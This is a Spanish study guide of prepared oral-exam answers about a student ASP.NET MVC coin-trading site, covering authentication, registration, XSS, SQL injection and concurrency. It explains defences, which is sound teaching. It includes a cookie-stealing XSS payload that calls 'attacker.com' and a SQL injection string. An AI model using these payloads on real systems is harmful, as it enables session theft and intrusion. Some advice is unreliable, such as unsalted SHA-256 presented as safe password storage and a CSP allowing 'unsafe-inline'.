# 🎤 PREGUNTAS PARA LA EVALUACIÓN - Respuestas Preparadas

> Guía de respuestas para las preguntas que probablemente te harán mañana

---

## 📋 TABLA RÁPIDA

| # | Pregunta | Tiempo | Archivo/Línea | Respuesta Clave |
|---|----------|--------|---------------|-----------------|
| 1 | ¿Cómo es responsive? | 5 min | responsive.css | Mobile-first + 5 breakpoints |
| 2 | ¿Cómo autenticas? | 5 min | Program.cs:17-37 | Cookies + SlidingExpiration |
| 3 | ¿Cómo registras usuarios? | 5 min | AccountController | DTO validation + DB constraint |
| 4 | ¿Cómo creas monedas? | 5 min | MonedasController.Create() | Solo admin + validación DTO |
| 5 | ¿Cómo prevines XSS? | 3 min | Program.cs:40 | HttpOnly + Razor escaping |
| 6 | ¿Cómo proteges BD? | 3 min | RepoUsuario.cs | Dapper con parámetros |
| 7 | ¿Qué es SlidingExpiration? | 2 min | Program.cs:30 | Renovación automática cada petición |
| 8 | ¿Por qué Repository Pattern? | 3 min | Interfaces | Separación de capas |
| 9 | ¿Race condition en compras? | 5 min | MonedasController | Validación + Triggers BD |
| 10 | ¿Contraseña olvidada? | 3 min | AccountController | ⚠️ No implementado |

---

## 1️⃣ PREGUNTA: "¿Cómo hiciste que la página sea responsive?"

### Respuesta Corta (30 segundos):
> "Mobile-first con Bootstrap 5 base + 5 media queries en CSS. Navbar colapsable, tablas adaptativas, Flexbox para layouts."

### Respuesta Media (2 minutos):
> "Usé estrategia mobile-first:
> 1. **Estilos base:** Para pantallas pequeñas (<576px)
> 2. **Media queries:** Amplío funcionalidades conforme crece pantalla
> 3. **Breakpoints:** 576px, 768px, 992px, 1200px
> 4. **Técnicas:** Flexbox para layouts flexibles, CSS variables para reutilización
> 5. **Bootstrap:** Grid 12 columnas, componentes responsivos
> 
> Ejemplos:
> - Navbar: ícono hamburguesa en móvil, menú horizontal en desktop
> - Tablas: overflow horizontal en móvil, normal en desktop
> - Imágenes: max-width 100% para no desbordar"

### Respuesta Larga (5 minutos con código):
> "Mira el archivo responsive.css. Primero defino breakpoints:
> 
> ```css
> /* Móvil: <576px (estilos base en site.css) */
> /* Tablets pequeñas: 576px-767px */
> @media (min-width: 576px) { ... }
> 
> /* Tablets: 768px-991px */
> @media (min-width: 768px) { ... }
> 
> /* Desktops: 992px-1199px */
> @media (min-width: 992px) { ... }
> 
> /* Desktops grandes: 1200px+ */
> @media (min-width: 1200px) { ... }
> ```
> 
> Ejemplo Navbar:
> - <576px: display: none para items, show hamburguesa
> - 992px+: display: flex para items, hide hamburguesa
> 
> Ejemplo Tabla:
> - <768px: overflow-x: auto, scroll horizontal
> - 768px+: display completo
> 
> **Bootstrap:** Ya trae responsiveness con clases como:
> - col-12 (100% móvil), col-md-6 (50% tablet), col-lg-4 (33% desktop)
> - d-none d-md-block: Ocultar en móvil, mostrar en tablet+
> 
> **CSS Variables:** Defino en root:
> ```css
> --color-primary: #007bff;
> --color-secondary: #6c757d;
> --spacing-unit: 1rem;
> ```
> Luego uso var(--color-primary) en todo, reutilizable."

### Dónde encontrar evidencia:
```
📁 {MarketWeight}.mvc/wwwroot/css/
├── site.css          ← Estilos base
├── responsive.css    ← Media queries (MOSTRAR ESTO)
└── _Layout.cshtml.css
```

### Si pregunta: "¿Cómo testeaste responsive?"
> "Usé:
> 1. DevTools de navegador (F12 → Device Emulation)
> 2. Redimensionar ventana manualmente
> 3. Probar en distintos dispositivos/navegadores
> 4. Chrome DevTools: simular iPhone, iPad, Android
> 
> No automaticé con Selenium porque es proyecto pequeño."

---

## 2️⃣ PREGUNTA: "¿Cómo implementaste autenticación?"

### Respuesta Corta (30 segundos):
> "Cookies con ASP.NET Core Authentication. Configuro en Program.cs: SlidingExpiration 30 min, HttpOnly para seguridad, verifica en cada request."

### Respuesta Media (2 minutos):
> "En Program.cs configuro:
> ```csharp
> AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
>   .AddCookie(options => {
>     options.SlidingExpiration = true;
>     options.ExpireTimeSpan = TimeSpan.FromMinutes(30);
>     options.Cookie.HttpOnly = true;
>     options.LoginPath = "/Account/Login";
>   });
> ```
> 
> Flujo:
> 1. Usuario Login: Entra email/pass
> 2. Verifico contra BD con SHA-256
> 3. Si válido: Creo ClaimsPrincipal con ID usuario
> 4. Firmo con SignInAsync() → genera cookie
> 5. Cookie viaja en cada petición
> 6. ASP.NET valida firma, restaura usuario
> 7. Si inactivo 30 min: Expira, redirige a login
> 
> HttpOnly previene XSS: JavaScript no accede a cookie."

### Respuesta Larga (5 minutos con código):
> "Aquí está el método Register en AccountController:
> 
> ```csharp
> [HttpPost]
> public async Task<IActionResult> Register(UsuarioDto usuario)
> {
>     if (ModelState.IsValid)
>     {
>         try
>         {
>             // Hashear contraseña
>             usuario.Password = HashPassword(usuario.Password);
>             
>             // Guardar en BD
>             _repoUsuario.Alta(usuario);
>             
>             // Redirigir a login
>             return RedirectToAction(\"Login\");
>         }
>         catch (ConstraintException) // Email duplicado
>         {
>             ModelState.AddModelError(\"\", \"Email ya registrado\");
>         }
>     }
>     return View(usuario);
> }
> ```
> 
> Y el método Login:
> ```csharp
> [HttpPost]
> public async Task<IActionResult> Login(LoginDto loginDto)
> {
>     var usuario = _repoUsuario.Obtener()
>         .FirstOrDefault(u => u.Email == loginDto.Email);
>     
>     if (usuario != null && 
>         HashPassword(loginDto.Password) == usuario.Password)
>     {
>         var claims = new List<Claim>
>         {
>             new Claim(ClaimTypes.NameIdentifier, usuario.IdUsuario.ToString()),
>             new Claim(ClaimTypes.Email, usuario.Email),
>             new Claim(\"Rol\", usuario.EsAdmin ? \"Admin\" : \"User\")
>         };
>         
>         var identity = new ClaimsIdentity(claims, 
>             CookieAuthenticationDefaults.AuthenticationScheme);
>         var principal = new ClaimsPrincipal(identity);
>         
>         await HttpContext.SignInAsync(
>             CookieAuthenticationDefaults.AuthenticationScheme,
>             principal);
>         
>         return RedirectToAction(\"Index\", \"Home\");
>     }
>     ModelState.AddModelError(\"\", \"Credenciales inválidas\");
>     return View(loginDto);
> }
> ```
> 
> **Seguridad:**
> - Contraseña nunca en plaintext
> - SHA-256 en BD
> - Cookie firmada (no modificable)
> - HttpOnly (no accesible por JS)
> - SameSite=Lax (protección CSRF básica)
> - Expira tras inactividad"

### Dónde encontrar evidencia:
```
{MarketWeight}.mvc/
├── Program.cs                    ← Líneas 17-40
├── Controllers/
│   └── AccountController.cs      ← Register, Login, Logout
└── Models/
    └── UsuarioDto.cs
```

### Si pregunta: "¿Qué es SlidingExpiration?"
> "Normalemente expiraría a tiempo fijo. SlidingExpiration:
> - Cookie expira 30 min DESDE la última petición
> - No desde que se creó
> - Cada petición que hagas renueva el contador
> - Si haces click en página cada 25 min, nunca expira
> - Si estás 30+ min inactivo, expira automático
> 
> Diferencia:
> - AbsoluteExpiration: Expira a las 14:00 sin importar actividad
> - SlidingExpiration: Expira si 30 min sin actividad"

### Si pregunta: "¿Y si alguien roba la cookie?"
> "Es un riesgo aunque esté HttpOnly:
> 
> **Riesgos:**
> 1. Session hijacking: Atacante suplanta usuario
> 2. Posible si: Ataque XSS (aunque HttpOnly dificulta), MITM (sin HTTPS)
> 
> **Mitigaciones implementadas:**
> 1. HttpOnly: No accesible por JavaScript
> 2. Secure (en producción con HTTPS): Solo por HTTPS
> 3. SameSite: Protección CSRF básica
> 4. Expiración: Tiempo limitado de validez
> 5. SignInAsync firma la cookie
> 
> **Mejora futura:**
> - Token JWT en lugar de cookies (stateless)
> - Incluir fingerprint (IP del cliente, User-Agent)
> - Rotating tokens: Cambiar token cada N peticiones
> - Usar HTTPS siempre"

---

## 3️⃣ PREGUNTA: "¿Cómo registras un nuevo usuario?"

### Respuesta Corta (30 segundos):
> "Formulario Register → DTO con validación → Hash SHA-256 → BD. Si email existe, error. Si ok, redirige a Login."

### Respuesta Media (2 minutos):
> "Proceso:
> 1. **Vista:** Register.cshtml - Formulario con campos:
>    - Nombre [Required]
>    - Apellido [Required]
>    - Email [Required, EmailAddress]
>    - Password [Required, MinLength(6)]
>    - Confirmar Password
> 
> 2. **DTO Validación:** UsuarioDto valida atributos
> 
> 3. **Controlador:** AccountController.Register(UsuarioDto)
>    - Valida ModelState
>    - Hashea contraseña con SHA-256
>    - Llama RepoUsuario.Alta(usuario)
> 
> 4. **Repositorio:** Detecta si email duplicado
>    - Si: Lanza ConstraintException (error BD 1062)
>    - Catch: Muestra 'Email ya registrado'
> 
> 5. **BD:** INSERT Usuario con:
>    - Saldo inicial = 0
>    - EsAdmin = false
>    - Trigger: Hashea password si no viene hasheada
> 
> 6. **Respuesta:** Redirige a Login para que inicie sesión"

### Respuesta Larga (5 minutos con código):
> "Ver AccountController.Register(). El flujo es:
> 
> ```csharp
> [HttpPost]
> [AllowAnonymous]
> public IActionResult Register(UsuarioDto usuario)
> {
>     // 1. Validar ModelState (atributos del DTO)
>     if (!ModelState.IsValid)
>         return View(usuario); // Vuelve a mostrar con errores
>     
>     // 2. Validar que no sea contraseña vacía
>     if (string.IsNullOrWhiteSpace(usuario.Password))
>     {
>         ModelState.AddModelError(\"\", \"Contraseña requerida\");
>         return View(usuario);
>     }
>     
>     // 3. Hashear contraseña
>     usuario.Password = HashPassword(usuario.Password);
>     
>     try
>     {
>         // 4. Intentar guardar en BD
>         _repoUsuario.Alta(usuario);
>         
>         // 5. Si éxito, ir a Login
>         ViewBag.Message = \"Registro exitoso. Inicia sesión.\";
>         return RedirectToAction(\"Login\");
>     }
>     catch (ConstraintException ex)
>     {
>         // 6. Si email duplicado, mostrar error
>         ModelState.AddModelError(\"\", $\"Error: {ex.Message}\");
>         return View(usuario);
>     }
>     catch (Exception ex)
>     {
>         // 7. Otros errores
>         _logger.LogError(ex, \"Error al registrar usuario\");
>         ModelState.AddModelError(\"\", \"Error interno. Intenta más tarde.\");
>         return View(usuario);
>     }
> }
> ```
> 
> En RepoUsuario.Alta():
> ```csharp
> public void Alta(Usuario usuario)
> {
>     try
>     {
>         var consulta = @\"INSERT INTO Usuario 
>             (nombre, apellido, email, pass, saldo, esAdmin) 
>             VALUES 
>             (@nombre, @apellido, @email, @pass, @saldo, @esAdmin)\";
>         
>         var parametros = new {
>             nombre = usuario.Nombre,
>             apellido = usuario.Apellido,
>             email = usuario.Email,
>             pass = usuario.Password,
>             saldo = 0M,
>             esAdmin = false
>         };
>         
>         Conexion.Execute(consulta, parametros);
>     }
>     catch (DbException e)
>     {
>         // 1062 = Duplicate key (email único)
>         if (e.ErrorCode == 1062)
>             throw new ConstraintException(
>                 $\"El email '{usuario.Email}' ya está registrado.\");
>         throw;
>     }
> }
> ```
> 
> **Validaciones:**
> - Email: EmailAddress (formato válido)
> - Email: UNIQUE en BD (no duplicar)
> - Password: SHA-256 hash antes de guardar
> - Nombre/Apellido: Required, max 100 chars
> - Saldo: Comienza en 0
> - Admin: False por defecto (solo admin puede cambiar)"

### Dónde encontrar evidencia:
```
{MarketWeight}.mvc/
├── Controllers/
│   └── AccountController.cs      ← Register (líneas ~60-120)
├── Models/
│   └── UsuarioDto.cs             ← Validaciones
└── Views/Account/
    └── Register.cshtml           ← Formulario
    
scripts sql/
└── 01 MarketWeight-ddl.sql       ← CREATE TABLE Usuario
```

### Si pregunta: "¿Por qué validar en DTO y en BD?"
> "Defensa en profundidad:
> 
> **DTO (validación cliente-servidor):**
> - Rápida feedback al usuario
> - Previene enviar datos inválidos a BD
> - Reduce carga BD
> 
> **BD (validación en constraints):**
> - Evita corrupción si bypaseas validación
> - Protege si atacan directamente BD
> - Garantiza integridad referencial
> 
> Nunca confíes solo en frontend."

---

## 4️⃣ PREGUNTA: "¿Cómo crean monedas? ¿Quién puede?"

### Respuesta Corta (30 segundos):
> "Solo admins. Formulario con nombre, precio, cantidad. Validación DTO. Se guarda en BD y disponible para todos."

### Respuesta Media (2 minutos):
> "Proceso en MonedasController.Create():
> 
> 1. **Autorización:** [Authorize] (solo logueados) + check IsAdmin
> 
> 2. **GET:** Mostrar formulario vacío
> 
> 3. **POST:** Recibe MonedaDto:
>    - Nombre [Required, StringLength(50)]
>    - Precio [Required, Range(0.01, ...)]
>    - Cantidad [Required, Range(1, int.Max)]
> 
> 4. **Validación:** ModelState.IsValid
> 
> 5. **Guardado:** RepoMoneda.Alta(moneda)
> 
> 6. **Respuesta:** Redirige a Index con todas las monedas
> 
> **Seguridad:**
> - Autorización: Solo admin accede
> - Validación: Precio/cantidad no negativas
> - DTOs: No permite inyección SQL (Dapper)
> - Auditoría: Se registra en BD con timestamp"

### Respuesta Larga (5 minutos con código):
> "En MonedasController.Create():
> 
> ```csharp
> [Authorize]
> [HttpGet]
> public IActionResult Create()
> {
>     // Verificar que es admin
>     var rolClaim = User.FindFirst(\"Rol\");
>     if (rolClaim?.Value != \"Admin\")
>         return Forbid(); // 403 Forbidden
>     
>     return View();
> }
> 
> [Authorize]
> [HttpPost]
> public IActionResult Create(MonedaDto moneda)
> {
>     // Verificar admin nuevamente (nunca confiar solo en cliente)
>     var rolClaim = User.FindFirst(\"Rol\");
>     if (rolClaim?.Value != \"Admin\")
>         return Forbid();
>     
>     // Validar ModelState
>     if (!ModelState.IsValid)
>         return View(moneda);
>     
>     try
>     {
>         // Guardar en BD
>         _repoMoneda.Alta(moneda);
>         return RedirectToAction(\"Index\");
>     }
>     catch (ConstraintException ex)
>     {
>         ModelState.AddModelError(\"\", $\"Error: {ex.Message}\");
>         return View(moneda);
>     }
> }
> ```
> 
> Validaciones en MonedaDto:
> ```csharp
> public class MonedaDto
> {
>     [Required(ErrorMessage = \"Nombre requerido\")]
>     [StringLength(50, MinimumLength = 1)]
>     public string Nombre { get; set; }
>     
>     [Required]
>     [Range(0.01, 999999.99, 
>         ErrorMessage = \"Precio debe estar entre 0.01 y 999999.99\")]
>     public decimal Precio { get; set; }
>     
>     [Required]
>     [Range(1, 1000000, 
>         ErrorMessage = \"Cantidad debe ser >= 1\")]
>     public decimal Cantidad { get; set; }
> }
> ```
> 
> En RepoMoneda.Alta():
> ```csharp
> public void Alta(Moneda moneda)
> {
>     var consulta = @\"INSERT INTO Moneda (nombre, precio, cantidad, fechaCreacion)
>                      VALUES (@nombre, @precio, @cantidad, NOW())\";
>     
>     var parametros = new {
>         nombre = moneda.Nombre,
>         precio = moneda.Precio,
>         cantidad = moneda.Cantidad
>     };
>     
>     Conexion.Execute(consulta, parametros);
>     // El UNIQUE en nombre es validado por BD
> }
> ```
> 
> **¿Quién puede crear?**
> - [Authorize]: Solo logueados
> - Rol = \"Admin\": Validado en controlador
> - Error 403 si intenta acceder sin ser admin"

### Si pregunta: "¿Cómo asegura que el admin no cree monedas falsas?"
> "Hay múltiples capas:
> 
> 1. **Acceso:** Solo logueados y admin
> 2. **Validación:** DTO requiere precio/cantidad válidos
> 3. **BD:** UNIQUE en nombre (no duplicar)
> 4. **Auditoría:** Se registra quién creó (podría mejorar)
> 
> **Posible problema:** Si el admin es corrupto, podría crear monedas falsas con valor 0 o enorme cantidad.
> 
> **Mejora:** Agregar tabla de auditoría y logs:
> ```sql
> CREATE TABLE MonedaAuditoria (
>     id INT PRIMARY KEY AUTO_INCREMENT,
>     monedaId INT,
>     accion VARCHAR(50),
>     usuarioAdmin INT,
>     fechaHora TIMESTAMP,
>     FOREIGN KEY (usuarioAdmin) REFERENCES Usuario(idUsuario)
> );
> ```"

---

## 5️⃣ PREGUNTA: "¿Cómo prevines XSS? ¿Qué es?"

### Respuesta Corta (30 segundos):
> "XSS: Atacante inyecta JavaScript. Lo prevengo con HttpOnly en cookies, Razor escaping automático, validación de inputs."

### Respuesta Media (2 minutos):
> "XSS (Cross-Site Scripting): Atacante inyecta código malicioso que corre en navegador del usuario.
> 
> Ejemplo ataque:
> ```html
> <!-- Atacante registra con esto en nombre -->
> <img src=x onerror=\"fetch('https://attacker.com?cookie=' + document.cookie)\">
> ```
> 
> Prevengo con:
> 1. **HttpOnly cookies:** JavaScript no accede a cookie de sesión
> 2. **Razor escaping:** @Model.Nombre escapa HTML automáticamente
> 3. **Validación:** StringLength en DTOs
> 4. **Content-Security-Policy:** Header para restringir scripts
> 5. **Sanitización:** Remover scripts de inputs
> 
> En Razor, este escapa:
> ```html
> <!-- Si Nombre = \"<script>alert('xss')</script>\" -->
> <div>@Model.Nombre</div>
> 
> <!-- Renderiza como: -->
> <div>&lt;script&gt;alert('xss')&lt;/script&gt;</div>\n```"

### Respuesta Larga (5 minutos):
> "XSS ocurre cuando código malicioso se ejecuta en navegador. Hay 3 tipos:
> 
> **1. Stored XSS (el más peligroso):**
> ```
> Atacante registra con: Nombre = \"<img src=x onerror=alert('XSS')>\"
> Se guarda en BD
> Cada usuario que ve ese usuario, la BD devuelve HTML con script
> Script corre en navegador del usuario
> Cookies robadas, redirect a phishing, etc.
> ```
> 
> Prevengo en:
> ```html
> <!-- Razor escapa automáticamente -->
> <h1>@usuario.Nombre</h1>
> <!-- Si tiene <script>, renderiza como &lt;script&gt; -->
> ```
> 
> ```csharp
> // DTO valida longitud (dificulta payload)
> [StringLength(100)]
> public string Nombre { get; set; }
> ```
> 
> **2. Reflected XSS:**
> ```
> URL: /search?query=<script>alert('xss')</script>
> Servidor devuelve la búsqueda sin escapar
> Script corre en navegador
> ```
> 
> Prevengo: Siempre escopear inputs con Razor.\n> 
> **3. DOM-based XSS:**
> ```javascript
> // JS vulnerabel
> document.getElementById('output').innerHTML = userInput;
> ```
> 
> Prevengo: Usar textContent en lugar de innerHTML.
> 
> **Mi implementación:**
> - HttpOnly=true en Program.cs:40
>   → Cookie no accesible por JS
>   → Aunque XSS exista, no roba sesión
> 
> - Razor escaping automático
>   → <b>@Model.Nombre</b> escapa HTML
> 
> - Validación DTOs
>   → Limita tamaño de payloads
> 
> - Content-Security-Policy (podría agregar)
>   ```csharp
>   app.Use(async (context, next) => {
>       context.Response.Headers.Add(\"Content-Security-Policy\",
>           \"default-src 'self'; script-src 'self' 'unsafe-inline'\");
>       await next();
>   });
>   ```"

### Si pregunta: "¿Y si alguien modifica la contraseña en el cliente?"
> "No puede porque:
> 1. Contraseña se hashea en SERVIDOR, no cliente
> 2. POST va al servidor con plaintext
> 3. Servidor hashea antes de guardar
> 4. BD nunca guarda plaintext
> 
> Si atacante intenta cambiar hash en red (MITM):
> - Sin HTTPS: ¡Vulnerable! Por eso HTTPS en producción
> - Con HTTPS: Encriptado, no se puede ver/modificar"

---

## 6️⃣ PREGUNTA: "¿Cómo proteges contra SQL Injection?"

### Respuesta Corta (30 segundos):
> "Uso Dapper con parámetros @nombre, @email. Nunca concateno strings. Cada variable es parámetro seguro."

### Respuesta Media (2 minutos):
> "SQL Injection: Atacante inyecta SQL en inputs.
> 
> Ejemplo ataque vulnerable:
> ```csharp
> // ❌ MALO - Vulnerable
> var consulta = $\"SELECT * FROM Usuario WHERE email = '{email}'\";
> // Si email = \"' OR '1'='1\", devuelve TODOS los usuarios
> ```
> 
> Mi defensa - Dapper con parámetros:
> ```csharp
> // ✅ BIEN - Seguro
> var consulta = \"SELECT * FROM Usuario WHERE email = @email\";
> var usuario = Conexion.QueryFirstOrDefault<Usuario>(consulta, 
>     new { email = emailIngresado });
> 
> // Dapper escapa automáticamente el valor
> ```
> 
> Ventaja: El parámetro es valor puro, no es SQL válido aunque contenga comillas."

### Respuesta Larga (5 minutos):
> "Dapper separa SQL del data:
> 
> ```csharp
> // En RepoUsuario.Obtener():
> public IEnumerable<Usuario> Obtener()
> {
>     // SQL es fijo, datos son parámetros
>     var consulta = \"SELECT idUsuario, nombre, apellido, email, pass AS Password, saldo, esAdmin AS EsAdmin FROM Usuario\";
>     return Conexion.Query<Usuario>(consulta);
> }
> 
> // En RepoUsuario.ObtenerPorEmail():
> public Usuario ObtenerPorEmail(string email)
> {
>     var consulta = \"SELECT * FROM Usuario WHERE email = @email\";
>     return Conexion.QueryFirstOrDefault<Usuario>(consulta, 
>         new { email }); // Parámetro nombrado
> }
> ```
> 
> **Por qué es seguro:**
> 1. Dapper trata @email como VALOR, no SQL
> 2. Aunque email contenga SQL, se trata como string
> 3. Base de datos recibe: SELECT * FROM Usuario WHERE email = (string)
> 4. No se ejecuta nada malicioso
> 
> **Comparativa:**
> ```
> ❌ Vulnerable (si usara concatenación):
> consulta = $\"SELECT * FROM Usuario WHERE email = '{email}'\"
> email = \"' OR '1'='1' --\"
> → SELECT * FROM Usuario WHERE email = '' OR '1'='1' --' (¡Devuelve TODOS!)
> 
> ✅ Seguro (con Dapper):
> consulta = \"SELECT * FROM Usuario WHERE email = @email\"
> email = \"' OR '1'='1' --\"
> → SELECT * FROM Usuario WHERE email = (string \"' OR '1'='1' --\")
> → Busca literal: \" ' OR '1'='1' -- \" (no encuentra nada, correcto)
> ```
> 
> **Otras prácticas:**
> 1. Validación: DTOs con [Required], [EmailAddress]
> 2. Principio de menor privilegio: DB user solo permisos necesarios
> 3. Prepared statements: Dapper lo hace automáticamente
> 4. Nunca confiar en entrada: Siempre validar/escapar"

---

## 7️⃣ PREGUNTA: "¿Qué es SlidingExpiration? ¿Cómo funciona?"

### Respuesta Corta (20 segundos):
> "Renueva cookie automáticamente con cada petición. Si activo, nunca expira. Si 30 min inactivo, expira."

### Respuesta Media (1 minuto):
> "SlidingExpiration renueva el timer con cada petición.
> 
> **Sin SlidingExpiration:**
> - Login a las 14:00
> - Expira a las 15:00 (1 hora absoluta)
> - Si usas app cada 50 min, expiras igual
> 
> **Con SlidingExpiration:**
> - Login a las 14:00
> - Cada petición renueva contador
> - Si haces click cada 25 min, nunca expiras
> - Si 30 min sin hacer nada, expiras
> 
> Configuración en Program.cs:
> ```csharp
> options.SlidingExpiration = true;
> options.ExpireTimeSpan = TimeSpan.FromMinutes(30);
> ```"

### Respuesta Larga (3 minutos):
> "SlidingExpiration = true es seguridad + comodidad.
> 
> **Cómo funciona:**
> ```
> 14:00 - Login
>   Cookie se crea: expira a 14:30
> 
> 14:15 - Usuario hace click
>   ASP.NET verifica cookie
>   Cookie está válida (faltan 15 min)
>   SlidingExpiration: Renueva expiry a 14:45
>   Usuario sigue logueado
> 
> 14:45 - Otro click
>   Cookie renovada a 15:15
> 
> 14:40 - Usuario se va (inactivo)
>   No hay más requests
>   15:15 - Cookie no renovada, expira
> 
> 15:20 - Usuario regresa
>   Cookie expirada (5 min atrás)
>   Redirect a /Account/Login
> ```
> 
> **Ventajas:**
> - Comodidad: No expiras si usas app frecuentemente
> - Seguridad: Expiras si abandonas máquina
> - Balance: No exagerado como 24h, ni corto como 5 min
> 
> **Alternativas:**
> - AbsoluteExpiration: Expira siempre a hora fija
> - Sin renovación: Expira a tiempo exacto sin renovar
> - Tokens: Usar JWT con refresh tokens"


## 9️⃣ PREGUNTA: "¿Qué pasa si 100 usuarios compran la misma moneda simultáneamente?"

### Respuesta Corta (30 segundos):
> "Race condition posible. Validación en controlador + Trigger en BD mitiguen. En producción: SELECT FOR UPDATE en transacción."

### Respuesta Media (3 minutos):
> "Race condition: Dos peticiones simultáneas, ambas leen stock=10, ambas restan, stock = -5 (¡negativo!).
> 
> **Mi defensa actual:**
> 1. Validación en controlador: cantidad <= stock
> 2. Trigger BD: Verifica cantidad antes de insert
> 
> **Problema:** Sin lock explícito, vulnerable en alta concurrencia.
> 
> **Solución ideal:**
> ```sql
> BEGIN TRANSACTION;
> SELECT cantidad FROM Moneda WHERE id = @id FOR UPDATE; -- Lock row
> -- Verificar cantidad
> -- Si ok, insert en Historial y update cantidad
> COMMIT;
> ```
> 
> En ASP.NET:
> ```csharp
> using (var transaction = Conexion.BeginTransaction())
> {
>     // Verificar stock con lock
>     var stock = Conexion.QueryFirstOrDefault<decimal>(
>         \"SELECT cantidad FROM Moneda WHERE id = @id FOR UPDATE\",
>         new { id });
>     
>     if (stock < cantidadAComprar)
>         throw new InvalidOperationException(\"Stock insuficiente\");
>     
>     // Transacción segura
>     transaction.Commit();
> }
> ```"

### Si pregunta: "¿Lo probaste con múltiples usuarios?"
> "En desarrollo local, no hace falta. Pero es un escenario:
> 
> **Cómo probarlo:**
> 1. Apache JMeter: Simular 100 usuarios simultáneos
> 2. Escribir test que lanza 100 tasks paralelos
> 3. Verificar que stock nunca sea negativo
> 
> **En mi proyecto:** Es básico, no lo implementé. Pero sé que existe el problema y cómo solucionarlo."

---

## 🔟 PREGUNTA: "¿Si olvido la contraseña, cómo la recupero?"

### Respuesta Honesta (30 segundos):
> "No está implementado. Tendrías que contactar al administrador. Lo haría con: Token temporal + Email con link + Reset password."

### Pregunta: "¿Escalabilidad? ¿Soporta 10,000 usuarios?"

**Respuesta:**
> "Actualmente:
> ✓ Soportaría ~1000 usuarios sin problemas
> ✗ 10,000: Necesitaría optimizaciones
> 
> Mejoras para escalar:
> 1. **Caching:** Redis para monedas (datos estáticos)
> 2. **BD:** Índices en campos búsqueda
> 3. **Async:** Async/await en repositorios
> 4. **Paginación:** Cargar datos en lotes
> 5. **CDN:** Servir CSS/JS desde CDN
> 6. **Load Balancing:** Múltiples servidores
> 7. **BD replicada:** Read replicas para lecturas
> 8. **Queue:** Procesar compras en background"

---